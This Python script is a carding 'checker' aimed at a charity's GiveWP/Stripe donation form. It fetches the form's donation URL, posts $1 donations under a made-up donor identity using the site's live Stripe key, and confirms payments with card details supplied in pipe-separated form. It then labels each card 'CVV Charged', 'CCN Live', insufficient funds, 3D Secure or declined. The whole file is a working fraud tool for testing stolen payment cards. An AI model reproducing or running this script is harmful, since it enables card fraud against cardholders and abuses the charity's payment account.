import re
import json
import requests

def get_donateUrl():
    try:
        result = requests.get("https://epicfoundation.us/?givewp-route=donation-form-view&form-id=232171&locale=en_US", timeout=10).text
        pattern = r'"donateUrl":\s*"([^"]+)"'
        match = re.search(pattern, result)
        if match:
            raw_url = match.group(1)
            cleaned_url = raw_url.replace(r"\/", "/")
            return cleaned_url
    except requests.RequestException:
        return None
    return None

def get_clientSecret(donateUrl):
    try:
        files = {
            'amount': (None, '1'), 'currency': (None, 'USD'), 'donationType': (None, 'single'),
            'formId': (None, '232171'), 'gatewayId': (None, 'stripe_payment_element'), 'firstName': (None, 'ALOK'),
            'lastName': (None, 'AGARWAL'), 'email': (None, 'creak@gmail.com'), 'anonymous': (None, 'false'),
            'comment': (None, ''), 'donationBirthday': (None, ''),
            'originUrl': (None, 'https://epicfoundation.us/?givewp-route=donation-form-view&form-id=232171&locale=en_US'),
            'isEmbed': (None, 'false'), 'embedId': (None, 'null'), 'locale': (None, 'null'),
            'gatewayData[stripePaymentMethod]': (None, 'card'), 'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'),
            'gatewayData[formId]': (None, '232171'),
            'gatewayData[stripeKey]': (None, 'pk_live_51LTB5XBfBIdBwobIGdYUoB0yZXe6SxvGCzUfoGODRDAB1zeceeQQkGvtKMLP0PXzZ0UWWm0Wjcfz88YSeIgxtrOD00I7SkGfY7'),
            'gatewayData[stripeConnectedAccountId]': (None, 'acct_1LTB5XBfBIdBwobI'),
        }
        result = requests.post(donateUrl, files=files, timeout=10).json()
        return result
    except requests.RequestException:
        return None

def confirm(clientSecret, pi, card):
    try:
        number, month, year, cvc = card.split("|")
        data = {
            "payment_method_data[billing_details][name]": "ALOK AGARWAL", "payment_method_data[billing_details][email]": "creak@gmail.com",
            "payment_method_data[billing_details][address][country]": "HK", "payment_method_data[type]": "card",
            "payment_method_data[card][number]": number, "payment_method_data[card][cvc]": cvc,
            "payment_method_data[card][exp_year]": year, "payment_method_data[card][exp_month]": month,
            "expected_payment_method_type": "card", "client_context[currency]": "usd", "client_context[mode]": "payment",
            "use_stripe_sdk": "true", "key": "pk_live_51LTB5XBfBIdBwobIGdYUoB0yZXe6SxvGCzUfoGODRDAB1zeceeQQkGvtKMLP0PXzZ0UWWm0Wjcfz88YSeIgxtrOD00I7SkGfY7",
            "_stripe_account": "acct_1LTB5XBfBIdBwobI", "client_secret": clientSecret
        }
        result = requests.post(f"https://api.stripe.com/v1/payment_intents/{pi}/confirm", data=data, timeout=15).json()
        return result
    except requests.RequestException:
        return {"error": {"message": "Request to Stripe timed out."}}

def process_card(card):
    donateUrl = get_donateUrl()
    if donateUrl is None:
        return {"card": card, "status": "Error", "message": "Failed to get donation URL"}

    secret_response = get_clientSecret(donateUrl)
    if not secret_response or "data" not in secret_response or "clientSecret" not in secret_response["data"]:
         return {"card": card, "status": "Error", "message": "Failed to get client secret"}

    clientSecret = secret_response["data"]["clientSecret"]
    pi = clientSecret.split("_secret")[0]

    confirm_result = confirm(clientSecret, pi, card)

    if confirm_result.get('status') == "succeeded":
        return {"card": card, "status": "Charged", "message": "CVV Charged"}
    elif "Your card's security code is incorrect." in json.dumps(confirm_result):
        return {"card": card, "status": "CCN Live", "message": "Your card's security code is incorrect."}
    elif 'insufficient funds' in json.dumps(confirm_result).lower():
        return {"card": card, "status": "Insufficient Funds", "message": "Insufficient Funds"}
    elif confirm_result.get('status') == "requires_action":
        return {"card": card, "status": "3D Secure", "message": "3D Secure verification required"}
    else:
        try:
            message = confirm_result.get('error', {}).get('message', 'Unknown error')
            decline_code = confirm_result.get('error', {}).get('decline_code', 'N/A')
            return {"card": card, "status": "Declined", "message": f"{decline_code}: {message}"}
        except Exception as e:
            return {"card": card, "status": "Error", "message": f"An unexpected error occurred: {str(e)}"}
